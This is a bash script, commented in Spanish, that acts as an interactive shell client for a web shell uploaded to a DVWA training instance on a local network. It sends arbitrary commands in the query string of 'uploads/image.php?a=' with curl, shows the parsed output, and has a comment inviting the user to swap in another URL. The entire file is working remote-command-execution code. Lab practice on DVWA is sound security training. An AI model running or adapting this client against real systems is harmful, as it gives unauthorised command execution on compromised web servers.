#!/bin/bash

var1="http://192.168.0.9/dvwa/hackable/uploads/image.php?a=whoami"
curl -X GET $var1  >  temporal1.txt 2>/dev/null
whoami=$(awk -v nr="$(wc -l < temporal1.txt)" 'NR>1 && NR<(nr-23)' temporal1.txt | cut -d ">" -f2)	#Busca el nombre del usuario
rm temporal1.txt

var2="http://192.168.0.9/dvwa/hackable/uploads/image.php?a=hostname"
curl -X GET $var2  >  temporal2.txt 2>/dev/null
hostname=$(awk -v nr="$(wc -l < temporal2.txt)" 'NR>1 && NR<(nr-23)' temporal2.txt | cut -d ">" -f2)	#Busca el nombre de la maquina
rm temporal2.txt

prompt=$whoami@$hostname:~$										#Crea el prompt para la shell

while true
do

	read -p $prompt' ' comando									#Le pide al usuario el comando

	if [ $comando = 'exit' ]; then
	    echo "Gracias por usar nuestra shell!"
	    echo ""
	    break
	fi 2>/dev/null
	
	if [ $comando = 'clear' ]; then
	    echo "No se puede hacer en esta shell :("
	    echo ""
	fi 2>/dev/null	
	
	if [ $comando = 'cd' ]; then
	    echo "No se puede hacer en esta shell :("
	    echo ""
	fi 2>/dev/null
	
	url="http://192.168.0.9/dvwa/hackable/uploads/image.php?a="					#Cambiar la url por la que necesite basandose en el ejemplo
	final=$(echo $url$comando | sed 's/ /%20/g')
	curl -X GET $final  >  respuesta.txt 2>/dev/null
	awk -v nr="$(wc -l < respuesta.txt)" 'NR>1 && NR<(nr-23)' respuesta.txt | cut -d ">" -f2
	rm respuesta.txt
done
